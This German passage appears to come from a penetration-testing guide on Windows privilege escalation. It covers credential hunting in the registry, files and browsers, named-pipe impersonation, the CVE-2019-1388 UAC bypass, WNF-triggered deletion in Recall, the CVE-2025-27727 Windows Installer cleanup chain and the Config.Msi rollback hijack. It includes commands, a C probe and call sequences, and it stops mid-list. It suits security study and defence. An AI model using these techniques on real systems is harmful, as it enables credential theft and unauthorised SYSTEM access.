Eine zugängliche gelöschte `.pfx`-Datei kann auch ein Hinweis auf **Codesignierung** sein. Wenn sie einen zugänglichen privaten Schlüssel enthält, kann dieser zum Signieren eines geänderten PowerShell-Skripts verwendet werden. [PowerShell erfordert ein Codesignaturzertifikat mit privatem Schlüssel](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), und [AppLocker-Publisherregeln prüfen die Identität des Signierers und den Geltungsbereich der Regel](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Für die kontoübergreifende Ausführung muss die aktuelle Identität das konkrete Skript ändern können, eine wirksame Regel die resultierende Signatur für das Skript und das Zielkonto akzeptieren und ein geplanter Task oder ein anderer Prozess mit höheren Berechtigungen das Skript tatsächlich ausführen. Ein `.pfx`-Dateiname, ein Zertifikatsinhaber oder ein beschreibbares Skript allein belegt keine vollständige Angriffskette. Prüfen Sie Metadaten, ACLs, Richtlinien und den geplanten Befehl, bevor Sie auf Material mit privaten Schlüsseln zugreifen oder den Task auslösen.

Prüfen Sie auch zugängliche Profildatenbanken, Notizen und empfangene Dateien von Messaging-Clients auf Hinweise auf Anmeldedaten. Ein BitLocker-Wiederherstellungsschlüsselexport kann als HTML- oder TXT-Datei gespeichert sein, manchmal in einem entsprechend benannten Backup-Archiv. Solches Material kann den Zugriff auf ein separates verschlüsseltes Datenvolume ermöglichen, das ältere Backups enthält. Prüfen Sie das Volume und das Archiv nur, wenn der Zugriff autorisiert ist. Wenn ein Backup `NTDS.dit` enthält, erfordert die Offline-Wiederherstellung von Domänenanmeldedaten außerdem die passende `SYSTEM`-Hive, wie im [Workflow für Backups und privilegierte Gruppen](../active-directory-methodology/privileged-groups-and-token-privileges.md) beschrieben. Dateinamen und ein gesperrtes Volume allein belegen nicht, dass ein verwendbarer Wiederherstellungsschlüssel oder ein Domänenbackup vorhanden ist.

Um in verschiedenen Programmen gespeicherte **Passwörter wiederherzustellen**, können Sie Folgendes verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### In der Registry

**Weitere mögliche Registry-Schlüssel mit Anmeldedaten**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**OpenSSH-Schlüssel aus der Registry extrahieren.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browserverlauf

Du solltest nach Datenbanken suchen, in denen Passwörter von **Chrome oder Firefox** gespeichert sind.\
Du solltest nach Datenbanken suchen, in denen Passwörter von **Chrome, Edge oder Firefox** gespeichert sind.\
Prüfe auch den Verlauf, die Lesezeichen und Favoriten der Browser, da dort möglicherweise **Passwörter gespeichert sind**.

Im herkömmlichen **Default**-Profil des aktuellen Benutzers befindet sich `Login Data` unter `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, während `Local State` im übergeordneten Verzeichnis `User Data` liegt. [Microsoft dokumentiert den Speicherort des Standardprofils](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); ein anderes Profil oder eine `UserDataDir`-Richtlinie kann den Speicherort ändern. Das Vorhandensein der Dateien ist lediglich ein Hinweis auf einen möglichen Anmeldedatenspeicher: Prüfe, ob die Dateien lesbar sind, ob der DPAPI-Kontext des jeweiligen Benutzers oder anderes autorisiertes Schlüsselmaterial verfügbar ist und ob ein gespeicherter Login zu einem Konto mit höheren Berechtigungen gehört. Eine reine Pfad-Aufzählung muss die Datenbank weder öffnen noch entschlüsselte Passwörter ausgeben.

Für Firefox dokumentiert [Mozilla](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), dass `key4.db` und `logins.json` eines Profils zusammengehörige Schlüssel- und verschlüsselte Anmeldedateien sind. Ihr Vorhandensein ist lediglich ein Hinweis: Prüfe, ob beide Dateien lesbar sind, ob gespeicherte Einträge vorhanden sind und ob ein Primary Password den Schlüssel schützt, bevor du zu dem Schluss kommst, dass die Zugangsdaten verwendet werden können. Wenn ein wiederhergestellter Zugang zu einem Domänenkonto gehört, prüfe separat dessen wirksame Gruppensteuerungsrechte sowie die [LAPS-Berechtigungen zum Lesen oder Entschlüsseln von Passwörtern](../active-directory-methodology/laps.md) der Gruppe; Browser-Artefakte allein weisen keinen Pfad zu Administratorrechten nach.

Tools zum Extrahieren von Passwörtern aus Browsern:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ist eine Technologie des Windows-Betriebssystems, die die **Kommunikation** zwischen Softwarekomponenten ermöglicht, die in unterschiedlichen Sprachen geschrieben sind. Jede COM-Komponente wird über eine **class ID (CLSID)** **identifiziert** und stellt Funktionalität über eine oder mehrere Schnittstellen bereit, die durch interface IDs (IIDs) identifiziert werden.

COM-Klassen und -Schnittstellen sind in der Registry unter **HKEY\CLASSES\ROOT\CLSID** beziehungsweise **HKEY\CLASSES\ROOT\Interface** definiert. Diese Registry entsteht durch das Zusammenführen von **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

In den CLSIDs dieser Registry findest du den untergeordneten Registry-Schlüssel **InProcServer32**, der einen **Standardwert** enthält, der auf eine **DLL** verweist, sowie einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single- oder Multi-Threaded) oder **Neutral** (Thread-Neutral) sein kann.

![Browserverlauf – COM DLL Overwriting: In den CLSIDs dieser Registry findest du den untergeordneten Registry-Schlüssel InProcServer32, der einen Standardwert enthält, der auf eine DLL verweist, sowie einen Wert...](<../../images/image (729).png>)

Wenn du grundsätzlich **eine der DLLs überschreiben** kannst, die ausgeführt werden sollen, könntest du **deine Berechtigungen erweitern**, falls diese DLL von einem anderen Benutzer ausgeführt wird.

Weitere Informationen dazu, wie Angreifer COM Hijacking als Persistenzmechanismus verwenden, findest du hier:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Allgemeine Suche nach Passwörtern in Dateien und der Registry**

**Dateiinhalte durchsuchen**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Nach einer Datei mit einem bestimmten Dateinamen suchen**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Suche in der Registry nach Schlüsselnamen und Passwörtern**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Tools, die nach Passwörtern suchen

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ist ein msf-Plugin**. Ich habe dieses Plugin erstellt, um **automatisch jedes Metasploit-POST-Modul auszuführen, das auf dem Zielsystem nach Zugangsdaten sucht**.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sucht automatisch nach allen Dateien, die die auf dieser Seite erwähnten Passwörter enthalten.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um Passwörter aus einem System zu extrahieren.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach **Sessions**, **Benutzernamen** und **Passwörtern** verschiedener Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Durchgesickerte Handles

Stell dir vor, **ein als SYSTEM laufender Prozess öffnet einen neuen Prozess** (`OpenProcess()`) mit **vollständigem Zugriff**. Derselbe Prozess **erstellt außerdem einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Berechtigungen, der jedoch alle geöffneten Handles des Hauptprozesses erbt**.\
Wenn du dann **vollen Zugriff auf den Prozess mit niedrigen Berechtigungen hast**, kannst du das **geöffnete Handle des privilegierten Prozesses**, das mit `OpenProcess()` erstellt wurde, abgreifen und **Shellcode injizieren**.\
[Lies dieses Beispiel, um mehr darüber zu erfahren, **wie diese Schwachstelle erkannt und ausgenutzt werden kann**.](leaked-handle-exploitation.md)\
[Lies auch [diesen Beitrag](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/) für eine ausführlichere Erklärung dazu, wie man weitere offene Handles von Prozessen und Threads testet und missbraucht, die mit unterschiedlichen Berechtigungsstufen vererbt werden (nicht nur mit vollem Zugriff).](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named-Pipe-Client-Impersonation

Gemeinsam genutzte Speichersegmente, sogenannte **Pipes**, ermöglichen die Kommunikation und Datenübertragung zwischen Prozessen.

Windows bietet eine Funktion namens **Named Pipes**, mit der voneinander unabhängige Prozesse Daten austauschen können, auch über verschiedene Netzwerke hinweg. Das ähnelt einer Client/Server-Architektur, in der die Rollen als **Named-Pipe-Server** und **Named-Pipe-Client** definiert sind.

Wenn ein **Client** Daten über eine Pipe sendet, kann der **Server**, der die Pipe eingerichtet hat, **die Identität des Clients annehmen**, sofern er über die erforderlichen **SeImpersonate**-Berechtigungen verfügt. Wenn du einen **privilegierten Prozess** findest, der über eine Pipe kommuniziert, die du nachahmen kannst, bietet sich dir die Möglichkeit, **höhere Berechtigungen zu erlangen**, indem du die Identität dieses Prozesses annimmst, sobald er mit der von dir eingerichteten Pipe interagiert. Anleitungen zur Durchführung eines solchen Angriffs findest du [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system).

Das folgende Tool ermöglicht außerdem, **die Kommunikation über eine Named Pipe mit einem Tool wie Burp abzufangen:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **Mit diesem Tool lassen sich alle Pipes auflisten und anzeigen, um Privesc-Möglichkeiten zu finden:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv: Remote-DWORD-Schreibzugriff bis hin zu RCE

Der Telephony-Dienst (TapiSrv) stellt im Servermodus `\\pipe\\tapsrv` (MS-TRP) bereit. Ein remote authentifizierter Client kann den asynchronen Ereignispfad auf Basis von Mailslots missbrauchen, um `ClientAttach` in einen beliebigen **4-Byte-Schreibvorgang** in eine vorhandene Datei umzuwandeln, in die `NETWORK SERVICE` schreiben darf. Anschließend kann er Telephony-Administratorrechte erlangen und eine beliebige DLL als Dienst laden. Der vollständige Ablauf:

- `ClientAttach` mit `pszDomainUser` auf einen vorhandenen, beschreibbaren Pfad gesetzt → der Dienst öffnet ihn über `CreateFileW(..., OPEN_EXISTING)` und verwendet ihn für asynchrone Ereignisschreibvorgänge.
- Bei jedem Ereignis wird der vom Angreifer kontrollierte `InitContext` aus `Initialize` in dieses Handle geschrieben. Registriere eine Line-App mit `LRegisterRequestRecipient` (`Req_Func 61`), löse `TRequestMakeCall` aus (`Req_Func 121`), rufe die Ereignisse über `GetAsyncEvents` ab (`Req_Func 0`) und hebe die Registrierung anschließend auf bzw. fahre den Dienst herunter, um die deterministischen Schreibvorgänge zu wiederholen.
- Füge dich in `C:\Windows\TAPI\tsec.ini` zu `[TapiAdministrators]` hinzu, stelle die Verbindung erneut her und rufe dann `GetUIDllName` mit einem beliebigen DLL-Pfad auf, um `TSPI_providerUIIdentify` als `NETWORK SERVICE` auszuführen.

Weitere Details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Sonstiges

### Dateierweiterungen, mit denen sich unter Windows Dateien ausführen lassen

Sieh dir die Seite **[https://filesec.io/](https://filesec.io/)** an.

### Missbrauch von Protokollhandlern / ShellExecute über Markdown-Renderer

An `ShellExecuteExW` weitergeleitete anklickbare Markdown-Links können gefährliche URI-Handler (`file:`, `ms-appinstaller:` oder jedes registrierte Schema) auslösen und vom Angreifer kontrollierte Dateien als aktueller Benutzer ausführen. Siehe:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Befehlszeilen auf Passwörter überwachen**

Wenn du eine Shell als Benutzer erhältst, gibt es möglicherweise geplante Tasks oder andere Prozesse, die **Anmeldedaten in der Befehlszeile übergeben**. Das folgende Skript erfasst alle zwei Sekunden die Befehlszeilen von Prozessen, vergleicht den aktuellen Zustand mit dem vorherigen und gibt alle Unterschiede aus.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Passwörter aus Prozessen stehlen

## Vom Benutzer mit niedrigen Berechtigungen zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn Sie Zugriff auf die grafische Benutzeroberfläche haben (über Konsole oder RDP) und UAC aktiviert ist, können Sie in einigen Versionen von Microsoft Windows als nicht privilegierter Benutzer ein Terminal oder einen anderen Prozess als „NT\AUTHORITY SYSTEM“ ausführen.

Dadurch können Sie mit derselben Sicherheitslücke gleichzeitig Ihre Berechtigungen erweitern und UAC umgehen. Außerdem müssen Sie nichts installieren, und die während des Vorgangs verwendete Binärdatei ist von Microsoft signiert und herausgegeben.

Zu den betroffenen Systemen gehören unter anderem:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Um diese Schwachstelle auszunutzen, müssen die folgenden Schritte ausgeführt werden:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Sie verfügen über alle erforderlichen Dateien und Informationen in diesem GitHub-Repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Von mittlerer Integritätsstufe als Administrator zur hohen Integritätsstufe / UAC-Bypass

Lesen Sie dies, um mehr über **Integritätsstufen** zu erfahren:


{{#ref}}
integrity-levels.md
{{#endref}}

Lesen Sie dann dies, um mehr über UAC und UAC-Bypasses zu erfahren:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junctions in Upload-Verzeichnissen in einem vom Webserver bereitgestellten Stammverzeichnis

Eine Anwendung kann ein vorhersehbares Upload-Unterverzeichnis erstellen, einen vom Aufrufer vorgegebenen Dateinamen darin speichern und die Datei anschließend verarbeiten. Wenn ein Benutzer mit geringen Berechtigungen dieses Unterverzeichnis vor dem serverseitigen Schreibvorgang entfernen und durch eine NTFS-Junction ersetzen kann, kann der Schreibvorgang der Junction in ein vom Webserver bereitgestelltes Verzeichnis folgen. Ein dort abgelegtes Skript kann mit der Identität des Webdienstes ausgeführt werden, wenn der Server diesen Dateityp ausführt. Dies ist eine anwendungsspezifische Grenze für beliebige Schreibvorgänge; ein beschreibbares Upload-Verzeichnis oder eine vorhandene Junction allein belegt dies nicht.

Prüfen Sie den genauen Pfadaufbau und den Zeitpunkt im Upload-Handler, die effektiven Lösch- und Erstellungsrechte des Benutzers für das Unterverzeichnis, die effektiven ACLs des Ziels, ob der Schreibvorgang Reparse Points folgt und ob der Webserver Dateien im Zielverzeichnis ausführt. Prüfen Sie die Prozessidentitäten des Schreibprozesses und des Webservers getrennt voneinander. Eine passive Bestandsaufnahme kann Verzeichnis-ACLs und Reparse-Metadaten anzeigen, aber weder das Verhalten des Handlers noch einen späteren Junction-Austausch belegen. Wenn die Ausführung in einem Dienstkonto-Kontext erfolgt, prüfen Sie das **tatsächliche Prozesstoken**, bevor Sie einen separaten Pfad über Token-Berechtigungen in Betracht ziehen.

## Durch WNF ausgelöste Bereinigung durch eine privilegierte geplante Aufgabe

Eine geplante Aufgabe, die eine manuelle Ausführung verweigert, kann dennoch einen Trigger offenlegen, der von einem unprivilegierten Benutzer ausgelöst werden kann. Exportieren Sie beim Überprüfen einer privilegierten Aufgabe deren XML und untersuchen Sie **alle** Trigger sowie die DACL der Aufgabe, den Sicherheitsprinzipal und die Aktion. Insbesondere benennt ein `WnfStateChangeTrigger` einen Windows Notification Facility (WNF)-Zustand. Wenn die ACL dieses absicherbaren Zustands dem aktuellen Benutzer das Veröffentlichen einer Aktualisierung erlaubt, kann der Benutzer die Aufgabe indirekt mit der konfigurierten Identität starten, obwohl `<AllowStartOnDemand>false</AllowStartOnDemand>` gesetzt ist.<sup>[[43]](#references)</sup>

Beispielsweise wurde die Recall-Aufgabe `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` als SYSTEM ausgeführt, akzeptierte Aktualisierungen des WNF-Zustands `7508BCA32C079E41` von einem Standardbenutzer und untersuchte anschließend `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, selbst wenn Recall deaktiviert war.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Um die Erreichbarkeit zu testen, lösen Sie `ZwUpdateWnfStateData` aus `ntdll.dll` auf, senden Sie eine leere Aktualisierung für den acht Byte langen Zustandsnamen und gleichen Sie den Rückgabestatus mit den Daten zum letzten Ausführen der Aufgabe oder den Procmon-Aktivitäten ab. Die folgende vereinfachte Probe verwendet die Bytefolge aus dem Recall-Aufgabenbeispiel; ersetzen Sie sie durch die für die zu testende Aufgabe exportierten Bytes.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Privilegiertes Löschen durch rekursive Bereinigung auslösen

Die nützliche Primitive ist nicht allein der Trigger, sondern eine privilegierte Bereinigungsroutine, die ein vom Angreifer kontrolliertes Verzeichnis akzeptiert. Verfolge den Vorgang von der Auflistung bis zur abschließenden Änderung: Profil-/Sitzungserkennung, durch Wildcards ausgewählte untergeordnete Elemente, `SHCreateItemFromParsingName` und `IFileOperation::DeleteItem` sind starke Indikatoren dafür, dass ein zuvor überprüfter Pfad später rekursiv durchlaufen wird. Werden Nachfahren nicht relativ zu vertrauenswürdigen Verzeichnis-Handles geöffnet und vor dem Löschen validiert, kann ein Angreifer die Pfadauflösung zwischen Auflistung und Verwendung ändern.<sup>[[43]](#references)</sup>

Kombiniere den WNF-Trigger mit der unten beschriebenen [oplock-, Junction- und Object-Manager-Symlink-Substitution](#from-folder-contents-delete-to-system-eop): Der oplock hält die Bereinigungsroutine an, nachdem sie das legitime untergeordnete Element ausgewählt hat, während der beschreibbare Vorfahr ersetzt wird. Dadurch wird das privilegierte Löschen nach der Fortsetzung über `\RPC Control` auf das geschützte Ziel umgeleitet. In der Recall-Kette führte dies zum Löschen von `C:\Config.Msi` durch SYSTEM, das für die dokumentierte MSI-Rollback-Technik erforderlich war.<sup>[[31]](#references)[[43]](#references)</sup>

### Verschachtelte Nachfahren umgehen oberflächliche Reparse-Point-Fixes

Nur die vom Angreifer kontrollierte Wurzel und ihr unmittelbares untergeordnetes Element zu validieren, sichert kein rekursives, pfadbasiertes Löschen. Lasse diese geprüften Objekte legitim und verlagere die Junction-/oplock-Substitution in ein zusätzliches untergeordnetes Element darunter; `IFileOperation::DeleteItem` erreicht schließlich den nicht validierten Nachfahren und folgt dessen neuem Ziel. CVE-2026-20941 entstand genau durch diese Art unvollständigen Fixes: Der erste Recall-Patch validierte `UKP` und das GUID-förmige Verzeichnis, behielt aber den bisherigen rekursiven Löschvorgang bei.<sup>[[43]](#references)</sup>

Das sichere Muster besteht darin, **jeden Nachfahren** relativ zu einem bereits vertrauenswürdigen Verzeichnis-Handle zu öffnen, den endgültig aufgelösten Pfad/das Objekt abzurufen und zu verifizieren und den Löschvorgang auf dieses verifizierte Handle anzuwenden. Validiere kein Präfix, um anschließend wieder zum rekursiven pfadbasierten Löschen zurückzukehren. Prüfe bei der Überprüfung eines Patches außerdem die Strukturen an der tatsächlichen Aufrufstelle: In diesem Fall zeigte die Laufzeitprüfung von `OBJECT_ATTRIBUTES` bei `NtCreateFile` einen nicht-null `RootDirectory` und einen relativen Namen `{GUID}\\secure_file.lock`. Damit wurde die irreführende Decompiler-Ausgabe widerlegt, die auf eine zweite `FILE_DELETE_ON_CLOSE`-Primitive hindeutete.<sup>[[43]](#references)</sup>

## Von beliebigem Löschen/Verschieben/Umbenennen eines Ordners zu SYSTEM-EoP

Die Technik wird [**in diesem Blogbeitrag**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beschrieben; Beispielcode ist [**hier verfügbar**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Bei dem Angriff wird die Rollback-Funktion von Windows Installer ausgenutzt, um während der Deinstallation legitime Dateien durch bösartige zu ersetzen. Dazu muss der Angreifer einen **bösartigen MSI-Installer** erstellen, der zum Hijacking des Ordners `C:\Config.Msi` verwendet wird. Windows Installer nutzt diesen später, um während der Deinstallation anderer MSI-Pakete Rollback-Dateien zu speichern, die so verändert werden, dass sie die bösartige Payload enthalten.

### Injection in den Windows-Installer-COM-Bereinigungspfad (CVE-2025-27727)

Ein Client mit niedrigen Berechtigungen kann über das COM-Objekt `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) den SYSTEM-Dienst `msiexec.exe` erreichen. Reverse Engineering identifizierte die relevanten `IMsiServer`-Aufrufe als `MsiBeginTransactionW` am vtable-Offset `0xA0`, `SetEEUIDirectoryAndFilter` bei `0xC8` und `CleanupTempPackages` bei `0x50`. Diese Namen und Offsets wurden durch Reverse Engineering ermittelt und können sich zwischen Builds unterscheiden.<sup>[[41]](#references)</sup>

Für einen Nicht-Administrator gibt `SetEEUIDirectoryAndFilter` den Aufrufer nur während des Öffnens des angegebenen Pfads mit `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` und `FILE_FLAG_OPEN_REPARSE_POINT` vorübergehend vor. Damit wird nachgewiesen, dass der Aufrufer das Verzeichnis löschen kann, und das Folgen eines Reparse Points verhindert. Der geprüfte Datei-Handle wird dadurch jedoch **nicht** an die spätere Bereinigung gebunden, und es wird auch nicht nachgewiesen, dass Windows Installer das Verzeichnis erstellt hat.<sup>[[41]](#references)</sup>

Nach `MsiBeginTransactionW` plant `SetEEUIDirectoryAndFilter` den Pfad unabhängig vom Filterargument des Aufrufers als Ordner ein. Der Dienst schreibt einen benannten `REG_DWORD`-Wert unter `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: Der Wertname ist der vom Aufrufer kontrollierte Pfad, und die Daten `0x00000002` kennzeichnen den Ordner. `CleanupTempPackages(NULL, FALSE)` startet anschließend die Bereinigung direkt. Der privilegierte Worker listet die Registrierungswerte auf und übergibt Ordner-Einträge an das rekursive `FDeleteFolder`, ohne die Herkunft des Pfads zu überprüfen. Schlägt die normale Entfernung fehl, ruft der Code außerdem `LockdownPath` auf, löscht Dateiattribute und versucht es erneut.<sup>[[41]](#references)</sup>

Die aus `msi.dll` rekonstruierte minimale Aufrufsequenz lautet:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Das nützliche Primitive ist die Wiederverwendung eines Pfads und nicht eine Junction-Umleitung. Registriere ein vom Angreifer erstelltes `C:\Config.Msi`, entferne es und lasse Windows Installer später denselben Pfad mit geschützten Rollback-Daten erneut erstellen. Die Bereinigung vertraut dem veralteten Namen `TempPackages` und löscht das neue Verzeichnis als SYSTEM. Damit wird die vorgesehene Schutzgrenze durch `FILE_FLAG_OPEN_REPARSE_POINT` und die Mitigation gegen nicht vertrauenswürdige Umleitungen umgangen, da kein Reparse Point erforderlich ist.<sup>[[41]](#references)</sup>

Dieses Lösch-Primitive passt zur folgenden Rollback-Kette: Bewahre den separaten `Installer\Folders`-Eintrag, lösche das geschützte `C:\Config.Msi`, erstelle es mit einer NULL-DACL neu und behalte ein Handle mit `WRITE_DAC`, bevor der Installer die DACL absichert. Über das vorab geöffnete Handle kann mit `NtSetSecurityObject` eine permissive DACL wiederhergestellt werden. Danach lässt sich die erzeugte `.rbs` ersetzen, bevor das Rollback fortgesetzt wird.<sup>[[41]](#references)</sup>

Microsoft hat den Pfad behoben, indem `CMsiTransaction::SetEEUIDirectoryAndFilter` daran gehindert wird, `ScheduleFileOrFolderDelete` aufzurufen, wenn das neue Feature-Gate aktiviert ist. Der COM-Aufruf kann weiterhin Erfolg zurückgeben, aber der vom Angreifer kontrollierte Pfad wird nicht mehr in `TempPackages` eingetragen. Installiere die Windows-Sicherheitsupdates vom April 2025, anstatt eine erfolgreiche Rückgabe der Methode als Patch-Test zu verwenden.<sup>[[41]](#references)[[42]](#references)</sup>

Die zusammengefasste Technik sieht folgendermaßen aus:

1. **Phase 1 – Vorbereitung des Hijacks (`C:\Config.Msi` leer lassen)**

- Schritt 1: MSI installieren
    - Erstelle eine `.msi`, die eine harmlose Datei (z. B. `dummy.txt`) in einem beschreibbaren Ordner (`TARGETDIR`) installiert.
    - Markiere den Installer als **„UAC Compliant“**, damit ein **Benutzer ohne Administratorrechte** ihn ausführen kann.
    - Lass nach der Installation ein **Handle** für die Datei geöffnet.

- Schritt 2: Deinstallation starten
    - Deinstalliere dieselbe `.msi`.
    - Der Deinstallationsprozess verschiebt Dateien nach `C:\Config.Msi` und benennt sie in `.rbf`-Dateien um (Rollback-Sicherungen).
    - **Überwache das geöffnete Datei-Handle** mit `GetFinalPathNameByHandle`, um zu erkennen, wann die Datei zu `C:\Config.Msi\<random>.rbf` wird.

- Schritt 3: Benutzerdefinierte Synchronisierung
    - Die `.msi` enthält eine **benutzerdefinierte Deinstallationsaktion (`SyncOnRbfWritten`)**, die:
        - signalisiert, wenn die `.rbf` geschrieben wurde.
        - anschließend auf ein weiteres Ereignis **wartet**, bevor die Deinstallation fortgesetzt wird.

- Schritt 4: Löschen der `.rbf` verhindern
    - Öffne nach der Signalisierung die `.rbf`-Datei **ohne `FILE_SHARE_DELETE`** — dadurch wird **verhindert, dass sie gelöscht wird**.
    - Signalisiere anschließend zurück, damit die Deinstallation abgeschlossen werden kann.
    - Windows Installer kann die `.rbf` nicht löschen. Da nicht alle Inhalte gelöscht werden können, wird **`C:\Config.Msi` nicht entfernt**.

- Schritt 5: `.rbf` manuell löschen
    - Lösche die `.rbf`-Datei manuell.
    - Jetzt ist **`C:\Config.Msi` leer** und bereit, übernommen zu werden.

> An diesem Punkt kannst du die **SYSTEM-Schwachstelle zum Löschen beliebiger Ordner** auslösen, um `C:\Config.Msi` zu löschen.

2. **Phase 2 – Rollback-Skripte durch schädliche Skripte ersetzen**

- Schritt 6: `C:\Config.Msi` mit schwachen ACLs neu erstellen
    - Erstelle den Ordner `C:\Config.Msi` selbst neu.
    - Setze **schwache DACLs** (z. B. Everyone:F) und **behalte ein Handle mit `WRITE_DAC` geöffnet**.

- Schritt 7: Eine weitere Installation ausführen
    - Installiere die `.msi` erneut mit:
        - `TARGETDIR`: Beschreibbarer Speicherort.
        - `ERROROUT`: Eine Variable, die einen erzwungenen Fehler auslöst.
    - Diese Installation wird verwendet, um erneut ein **Rollback** auszulösen, das `.rbs` und `.rbf` liest.

- Schritt 8: Auf `.rbs` überwachen
    - Überwache `C:\Config.Msi` mit `ReadDirectoryChangesW`, bis eine neue `.rbs` erscheint.
    - Erfasse ihren Dateinamen.

- Schritt 9: Vor dem Rollback synchronisieren
